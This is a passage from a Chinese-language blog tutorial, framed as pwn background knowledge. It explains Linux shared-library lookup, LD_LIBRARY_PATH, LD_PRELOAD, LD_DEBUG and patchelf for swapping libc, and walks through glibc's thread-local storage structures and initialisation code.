<h3 id="符号版本"><a href="#符号版本" class="headerlink" title="符号版本"></a>符号版本</h3><p>根据提到的可知，一个程序所依赖的共享库的次版本号如果高于系统中的共享库，那么就不保证该程序能在该系统中运行，这类问题叫做次版本号交会问题（Minor-revision Rendezvous Problem）。</p>
<p>这种次版本号交会问题并没有因为 SO-NAME 的存在而得到任何改善。对于这个问题，现代的系统通过一种更加精巧的方式来解决，那就是符号版本机制。这个方案的基本思路是让每个导出和导入的符号都有一个相关联的版本号，它的实际做法类似于名称修饰的方法。</p>
<p><code>.dynamic</code> 段中的 <code>DT_VERSYM</code> 类型字段包含了符号版本。它的作用是维护库的版本信息，以便在运行时进行版本控制和符号解析。通过 <code>DT_VERSYM</code> ，动态链接器可以确定所链接的库的版本与运行时环境是否兼容，以及选择正确的版本来解析符号。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005224309.png"
                      alt="image-20241108005224309"
                ></p>
<h2 id="共享库系统路径"><a href="#共享库系统路径" class="headerlink" title="共享库系统路径"></a>共享库系统路径</h2><p>目前大多数包括 Linux 在内的开源操作系统都遵守一个叫做 FHS（File Hierarchy Standard）的标准，这个标准规定了一个系统中的系统文件应该如何存放，包括各个目录的结构、组织和作用，这有利于促进各个开源操作系统之间的兼容性。共享库作为系统中重要的文件，它们的存放方式也被 FHS 列入了规定范围。FHS 规定，一个系统中主要有两个存放共享库的位置，它们分别如下：</p>
<ul>
<li><code>/lib</code>：该目录包含操作系统核心组件所需的共享库文件。这些库文件通常是系统引导和运行时所必需的，例如与操作系统内核相关的库文件。</li>
<li><code>/usr/lib</code>：该目录包含操作系统提供的额外共享库文件。这些库文件用于支持系统上安装的应用程序和工具的运行，如图形界面工具包（GUI toolkit）、网络库、数据库驱动程序等。</li>
<li><code>/usr/local/lib</code>：该目录是用于安装本地（local）软件的库文件的默认位置。当用户手动编译和安装软件到系统时，通常会将其安装到 <code>/usr/local</code> 目录下。因此，相关的库文件也会被安装到 <code>/usr/local/lib</code> 目录下。</li>
</ul>
<h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><p>动态链接器对于模块的查找有一定的规则：如果 <code>DT_NEED</code> 里面保存的是绝对路径，那么动态链接器就按照这个路径去查找；如果 <code>DT_NEED</code> 里面保存的是相对路径，那么动态链接器会在 <code>/lib</code> 、<code>/usr/lib</code> 和由 <code>/etc/ld.so.conf</code> 配置文件指定的目录中查找共享库。为了程序的可移植性和兼容性，共享库的路径往往是相对的。</p>
<p><code>ld.so.conf</code> 是一个文本配置文件，它可能包含其他的配置文件，这些配置文件中存放着目录信息。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf         </span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf.d/*.conf               </span><br><span class="line">/usr/lib/x86_64-linux-gnu/libfakeroot</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/i386-linux-gnu</span><br><span class="line">/lib/i386-linux-gnu</span><br><span class="line">/usr/lib/i386-linux-gnu</span><br><span class="line">/usr/local/lib/i686-linux-gnu</span><br><span class="line">/lib/i686-linux-gnu</span><br><span class="line">/usr/lib/i686-linux-gnu</span><br><span class="line"><span class="comment"># libc default configuration</span></span><br><span class="line">/usr/local/lib</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/x86_64-linux-gnu</span><br><span class="line">/lib/x86_64-linux-gnu</span><br><span class="line">/usr/lib/x86_64-linux-gnu</span><br><span class="line"><span class="comment"># Legacy biarch compatibility support</span></span><br><span class="line">/lib32</span><br><span class="line">/usr/lib32</span><br></pre></td></tr></table></figure></div>
<p>如果动态链接器在每次查找共享库时都去遍历这些目录，那将会非常耗费时间。所以 Linux 系统中都有一个叫做 <code>ldconfig</code> 的程序，这个程序的作用是为共享库目录下的各个共享库创建、删除或更新相应的 SO-NAME（即相应的符号链接），这样每个共享库的 SO-NAME 就能够指向正确的共享库文件；并且这个程序还会将这些 SO-NAME 收集起来，集中存放到 <code>/etc/ld.so.cache</code> 文件里面，并建立一个 SO-NAME 的缓存。当动态链接器要查找共享库时，它可以直接从 <code>/etc/ld.so.cache</code> 里面查找。而 <code>/etc/ld.so.cache</code> 的结构是经过特殊设计的，非常适合查找，所以这个设计大大加快了共享库的查找过程。</p>
<p>如果动态链接器在 <code>/etc/ld.so.cache</code> 里面没有找到所需要的共享库，那么它还会遍历 <code>/lib</code> 和 <code>/usr/lib</code> 这两个目录，如果还是没找到，就宣告失败。</p>
<p>所以理论上讲，如果我们在系统指定的共享库目录下添加、删除或更新任何一个共享库，或者我们更改了 <code>/etc/ld.so.conf</code> 的配置，都应该运行 <code>ldconfig</code> 这个程序，以便调整 SO-NAME 和 <code>/etc/ld.so.cache</code> 。很多软件包的安装程序在往系统里面安装共享库以后都会调用 <code>ldconfig</code> 。</p>
<h2 id="更改共享库"><a href="#更改共享库" class="headerlink" title="更改共享库"></a>更改共享库</h2><p>Linux 系统提供了很多方法来改变动态链接器装载共享库路径的方法，通过使用这些方法，我们可以满足一些特殊的需求，比如共享库的调试和测试、应用程序级别的虚拟等。</p>
<h3 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h3><p>在 Linux 系统中，<code>LD_LIBRARY_PATH</code> 是一个由若干个路径组成的环境变量，每个路径之间由冒号隔开。默认情况下， <code>LD_LIBRARY_PATH</code> 为空。如果我们为某个进程设置了 <code>LD_LIBRARY_PATH</code> ，那么进程在启动时，动态链接器在查找共享库时，会首先查找由 <code>LD_LIBRARY_PATH</code> 指定的目录。这个环境变量可以很方便地让我们测试新的共享库或使用非标准的共享库。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的 pwntools 脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">sh = process(<span class="string">&quot;./lib/ld.so --preload libdl.so.2 ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>: <span class="string">&quot;./lib/&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>系统中另外还有一个环境变量叫做 <code>LD_PRELOAD</code> ，这个文件中我们可以指定预先装载的一些共享库甚或是目标文件。在 <code>LD_PRELOAD</code> 里面指定的文件会在动态链接器按照固定规则搜索共享库之前装载，它比 <code>LD_LIBRARY_PATH</code> 里面所指定的目录中的共享库还要优先。无论程序是否依赖于它们，<code>LD_PRELOAD</code> 里面指定的共享库或目标文件都会被装载。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的 pwntools 脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">process(<span class="string">&quot;./lib/ld.so ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./lib/libc.so.6 ./lib/libdl.so.2&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
<h3 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h3><p>另外还有一个非常有用的环境变量 <code>LD_DEBUG</code> ，这个变量可以打开动态链接器的调试功能，当我们设置这个变量时，动态链接器会在运行时打印出各种有用的信息，对于我们开发和调试共享库有很大的帮助。</p>
<p>例如运行 <code>LD_DEBUG=files /bin/ls</code> 命令时动态链接器打印出了整个装载过程，显示程序依赖于哪个共享库并且按照什么步骤装载和初始化，共享库装载时的地址等。</p>
<ul>
<li><code>bindings</code>：显示动态链接的符号绑定过程。</li>
<li><code>libs</code>：显示共享库的查找过程。</li>
<li><code>versions</code>：显示符号的版本依赖关系。</li>
<li><code>reloc</code>：显示重定位过程。</li>
<li><code>symbols</code>：显示符号表查找过程。</li>
<li><code>statistics</code>：显示动态链接过程中的各种统计信息。</li>
</ul>
<h3 id="patchelf-1"><a href="#patchelf-1" class="headerlink" title="patchelf"></a>patchelf</h3><p>用于对于依赖不是很复杂的程序更换 libc ，有一下几点需要注意：</p>
<ul>
<li>如果在漏洞利用时用到了动态链接相关结构最好不要 patchelf，因为 patchelf 会改变动态链接相关结构的位置。</li>
<li>一个程序在一个版本的虚拟机里面 patchelf 后换到另一个版本虚拟机中可能会运行失败。</li>
<li>在 patch 完 libc 后最好把 ld 也 patch 成大版本相同的 ld ，否则会运行失败。</li>
</ul>
<p>修改 libc：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure></div>
<p>修改 ld：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-2.31.so ./pwn</span><br></pre></td></tr></table></figure></div>
<h1 id="多线程与-TLS"><a href="#多线程与-TLS" class="headerlink" title="多线程与 TLS"></a>多线程与 TLS</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈（如果它知道其他线程的堆栈地址，那么这就是很少见的情况），但实际运用中线程也拥有自己的私有存储空间，包括以下几方面：</p>
<ul>
<li>栈（尽管并非完全无法被其他线程访问，但一般情况下仍然可以认为是私有的数据）。</li>
<li>线程局部存储（Thread Local Storage, TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的容量。</li>
<li>寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</li>
</ul>
<p>实际上，线程私有的数据有：</p>
<ul>
<li>局部变量</li>
<li>函数的参数</li>
<li><strong>TLS 数据</strong></li>
</ul>
<p>线程共享的数据有：</p>
<ul>
<li>全局变量</li>
<li>堆上的数据</li>
<li>函数里的静态变量</li>
<li>程序代码，任何线程都有有权利读取并执行任何代码。</li>
<li>打开的文件，A 线程打开的文件可以由 B 线程读写。</li>
</ul>
<p>一个<strong>全局变量</strong>如果使用 <code>__thread</code> 关键字修饰，那么这个变量就变成线程私有的 <strong>TLS 数据</strong>，也就是说每个线程都在自己所属 TLS 中单独保存一份这个变量的副本。例如下面的代码中，<code>a</code> 和 <code>b</code> 都是 TLS 数据，而 <code>c</code> 是全局变量。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -g -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">uint32_t</span> a = <span class="number">0x114514</span>;</span><br><span class="line">__thread <span class="type">uint32_t</span> b;</span><br><span class="line"><span class="type">uint32_t</span> c = <span class="number">0x1919810</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    a = <span class="number">0x12345678</span>;</span><br><span class="line">    b = <span class="number">0x87654321</span>;</span><br><span class="line">    c = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec78f0738) = 12345678, b(0x7f1ec78f073c) = 87654321, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec70ed6f8) = 114514, b(0x7f1ec70ed6fc) = 0, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
<p>分析生成的 ELF 文件的节表，发现多出了 <code>.tdata</code> 和 <code>.tbss</code> ，这两个节分别记录已初始化和未初始化的 TLS 数据。</p>
<p>其中 <code>.tbss</code> 在 ELF 文件中不占用空间， <code>.tdata</code> 在 ELF 中存储了初始化的数据，比如上面的代码中的 <code>__thread uint32_t a = 0x114514</code> 。</p>
<p>ELF 加载到内存中后， <code>.tdata</code> 和 <code>.tbss</code> 这两个节合并为一个段，在程序头表中这个段的 <code>p_type</code> 为 <code>PT_TLS(7)</code> 。</p>
<p>TLS（Thread Local Storage）的结构与 TCB（Thread Control Block）以及 dtv（dynamic thread vector）密切相关，每一个线程中每一个使用了 TLS 功能的模块都拥有一个 TLS Block 。这几者的关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005249673.png"
                      alt="image-20241108005249673"
                ></p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>这里是 x86_64-ABI 要求的 TLS 结构，Glibc 实现的 TLS 结构与上图有一些差异。</p>

    </div>
  </div>

<p>根据图中显示的信息，TLS Blocks 可以分为两类：</p>
<ul>
<li>一类是程序装载时就已经存在的（位于 TCB 前），这一部分 Block 被称为 <code>_static TLS_</code> 。</li>
<li>一类是右边的 Blocks 是动态分配的，它们被使用 <code>dlopen</code> 函数在程序运行时动态装载的模块所使用。</li>
</ul>
<p>TCB 作为线程控制块，保存着 <code>dtv</code> 数组的入口，<code>dtv</code> 数组中的每一项都是 TLS Block 的入口，它们是指向 TLS Blocks 的指针。特别的，<code>dtv</code> 数组的第一个成员是一个计数器，每当程序使用 <code>dlopen</code> 函数或者 <code>dlfree</code> 函数加载或者卸载一个具备 TLS 变量的模块，该计数器的值都会加一，从而保证程序内版本的一致性。 特别的，ELF 文件本身对应的 TLS Block 一定在 <code>dtv</code> 数组中占据索引为 1 的位置，且位置上与 TCB 相邻。 还需要注意的是，图中出现了一个名为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>p</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">tp_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的指针，在 i386 架构上，这个指针为 gs 段寄存器；在 x86_64 架构上，该指针为 fs 段寄存器。由于该指针与 ELF 文件本身对应的 TLS Block 之间的偏移是固定的，程序在编译时就可以将 ELF 中线程变量的地址硬编码到目标文件中。</p>
<h2 id="主线程-TLS-初始化"><a href="#主线程-TLS-初始化" class="headerlink" title="主线程 TLS 初始化"></a>主线程 TLS 初始化</h2><p>前面提到过在 <code>main</code> 开始前会调用 <code>__libc_setup_tls</code> 初始化 TLS 。</p>
<p>在 <code>__libc_setup_tls</code> 函数中，首先会遍历 ELF 的程序头表，找到 <code>p_type</code> 为 <code>PT_TLS(7)</code> 的段，这个段中就存储着 TLS 的初始化数据。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Look through the TLS segment if there is any.  */</span></span><br><span class="line"><span class="keyword">if</span> (_dl_phdr != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">for</span> (phdr = _dl_phdr; phdr &lt; &amp;_dl_phdr[_dl_phnum]; ++phdr)</span><br><span class="line">        <span class="keyword">if</span> (phdr-&gt;p_type == PT_TLS) &#123;</span><br><span class="line">            <span class="comment">/* Remember the values we need.  */</span></span><br><span class="line">            memsz = phdr-&gt;p_memsz;</span><br><span class="line">            filesz = phdr-&gt;p_filesz;</span><br><span class="line">            initimage = (<span class="type">void</span> *) phdr-&gt;p_vaddr + main_map-&gt;l_addr;</span><br><span class="line">            align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">if</span> (phdr-&gt;p_align &gt; max_align)</span><br><span class="line">                max_align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后通过 <code>brk</code> 调用为 TLS 中的数据以及一个 <code>pthread</code> 结构体分配内存。其中 <code>pthread</code> 结构体的第一项为 <code>tcbhead_t header;</code> ，即前面提到的 <strong>TCB</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Align the TCB offset to the maximum alignment, as</span></span><br><span class="line"><span class="comment">   _dl_allocate_tls_storage (in elf/dl-tls.c) does using __libc_memalign</span></span><br><span class="line"><span class="comment">   and dl_tls_static_align.  */</span></span><br><span class="line">tcb_offset = roundup (memsz + GLRO(dl_tls_static_surplus), max_align);</span><br><span class="line">tlsblock = __sbrk(tcb_offset + TLS_INIT_TCB_SIZE + max_align);</span><br></pre></td></tr></table></figure></div>
<p><code>tcbhead_t</code> 结构体定义如下，也就是很多资料中提到的 TLS 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __ASSUME_PRIVATE_FUTEX</span></span><br><span class="line">  <span class="type">int</span> private_futex;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_reserved1;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> __glibc_reserved2;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>之后初始化 <code>_dl_static_dtv</code> ，也就是前面提到的 <strong><code>dtv</code> 数组</strong>，具体过程为：</p>
<ul>
<li>将 <code>tlsblock</code> 地址关于 <code>max_align</code> 向上对齐。</li>
<li><code> _dl_static_dtv[0].counter</code> 初始化为 <code>dtv</code> 的数量，由于 <code>_dl_static_dtv</code> 前两项分别用于记录 <code>dtv</code> 总数和使用的数量，因此这里记录的 <code>dtv</code> 数量是要减去这两项的。</li>
<li><code> _dl_static_dtv[1].counter</code> 初始化为 0 。</li>
<li><code>_dl_static_dtv[2]</code> 也就是当前模块对应的 <code>dtv</code> 的 <code>pointer.val</code> 指向 TLS 。</li>
<li><code>_dl_static_dtv[2].pointer.to_free</code> 置为 NULL 。</li>
<li>将 TLS 的初始数据也就是 <code>PT_TLS</code> 段中的数据复制到 TLS 中。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *val;                    <span class="comment">/* Pointer to data, or TLS_DTV_UNALLOCATED.  */</span></span><br><span class="line">  <span class="type">void</span> *to_free;                <span class="comment">/* Unaligned pointer, for deallocation.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for the dtv.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">dtv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> counter;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span> <span class="title">pointer</span>;</span></span><br><span class="line">&#125; <span class="type">dtv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Number of additional entries in the slotinfo array of each slotinfo</span></span><br><span class="line"><span class="comment">   list element.  A large number makes it almost certain take we never</span></span><br><span class="line"><span class="comment">   have to iterate beyond the first element in the slotinfo list.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TLS_SLOTINFO_SURPLUS (62)</span></span><br><span class="line"><span class="type">dtv_t</span> _dl_static_dtv[<span class="number">2</span> + TLS_SLOTINFO_SURPLUS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Align the TLS block.  */</span></span><br><span class="line">    tlsblock = (<span class="type">void</span> *) (((<span class="type">uintptr_t</span>) tlsblock + max_align - <span class="number">1</span>)</span><br><span class="line">                         &amp; ~(max_align - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the dtv.  [0] is the length, [1] the generation counter.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">0</span>].counter = (<span class="keyword">sizeof</span>(_dl_static_dtv) / <span class="keyword">sizeof</span>(_dl_static_dtv[<span class="number">0</span>])) - <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// _dl_static_dtv[1].counter = 0;		would be needed if not already done</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the TLS block.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.val = ((<span class="type">char</span> *) tlsblock + tcb_offset</span><br><span class="line">                                     - roundup (memsz, align ?: <span class="number">1</span>));</span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* sbrk gives us zero&#x27;d memory, so we don&#x27;t need to clear the remainder.  */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(_dl_static_dtv[<span class="number">2</span>].pointer.val, initimage, filesz);</span><br></pre></td></tr></table></figure></div>
此时 TLS 相关结构之间的关系如下图所示：</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005415665.png"
                      alt="image-20241108005415665"
                ><br>另外还会初始化 <code>link_map</code> 中的 TLS 相关的数据，由此我们可以知道 <code>link_map</code> 中这些字段的含义：</p>
<ul>
<li><code>l_tls_offset </code>：TCB 在 TLS 中的偏移。</li>
<li><code>l_tls_align</code>：TLS 初始数据的对齐，在 TLS 中 TLS 初始数据关于 <code>l_tls_align</code> 向上取整。</li>
<li><code>l_tls_blocksize</code>：TLS 初始数据的大小，也就是前面提到的 TLS Block 的大小。</li>
<li><code>l_tls_initimage</code>：TLS 初始数据的地址。也就是 <code>PT_TLS</code> 段的地址。</li>
<li><code>l_tls_initimage_size</code>：<code>PT_TLS</code> 段在文件中的大小，也就是 <code>.tdata</code> 的大小。</li>
<li><code>l_tls_modid</code>：模块编号。</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">main_map</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">main_map-&gt;l_tls_offset = roundup (memsz, align ?: <span class="number">1</span>);</span><br><span class="line"><span class="comment">/* Update the executable&#x27;s link map with enough information to make</span></span><br><span class="line"><span class="comment">   the TLS routines happy.  */</span></span><br><span class="line">main_map-&gt;l_tls_align = align;</span><br><span class="line">main_map-&gt;l_tls_blocksize = memsz;</span><br><span class="line">main_map-&gt;l_tls_initimage = initimage;</span><br><span class="line">main_map-&gt;l_tls_initimage_size = filesz;</span><br><span class="line">main_map-&gt;l_tls_modid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<h2 id="创建线程时-TLS-初始化"><a href="#创建线程时-TLS-初始化" class="headerlink" title="创建线程时 TLS 初始化"></a>创建线程时 TLS 初始化</h2><p>创建线程的函数 <code>pthread_create</code> 实际调用的是 <code>__pthread_create_2_1</code> 函数，在该函数中调用了 <code>allocate_stack</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> ALLOCATE_STACK(attr, pd) allocate_stack (attr, pd, &amp;stackaddr)</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err = ALLOCATE_STACK (iattr, &amp;pd);</span><br></pre></td></tr></table></figure></div>
<p>在 <code>allocate_stack</code> 函数中会调用 <code>mmap</code> 为线程分配栈空间，然后初始化栈底为一个 <code>pthread</code> 结构体并将指针 <code>pd</code> 指向该结构体。最后调用 <code>_dl_allocate_tls</code> 函数为 TCB 创建 <code>dtv</code> 数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span>;</span></span><br><span class="line">...</span><br><span class="line">  mem = __mmap (<span class="literal">NULL</span>, size, (guardsize == <span class="number">0</span>) ? prot : PROT_NONE,</span><br><span class="line">	MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  ...</span><br><span class="line">  pd = (<span class="keyword">struct</span> pthread *) ((((<span class="type">uintptr_t</span>) mem + size) - TLS_TCB_SIZE) &amp; ~__static_tls_align_m1);</span><br><span class="line">...</span><br><span class="line">_dl_allocate_tls (TLS_TPADJ (pd))</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_allocate_tls </code> 函数依次调用 <code>allocate_dtv</code> 和 <code>_dl_allocate_tls_init</code> 分配和初始化 <code>dtv</code> 数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">_dl_allocate_tls (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _dl_allocate_tls_init (mem == <span class="literal">NULL</span></span><br><span class="line">				? _dl_allocate_tls_storage ()</span><br><span class="line">				: allocate_dtv (mem));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>allocate_dtv</code> 函数调用了 ptmalloc 堆管理器的 <code>calloc</code> 函数为 <code>dtv</code> 数组分配内存，初始化 <code>dtv[0].counter</code> 为数组中元素数量，并且让 <code>pd-&gt;dtv</code> 指向 <code>dtv[1]</code> 。</p>
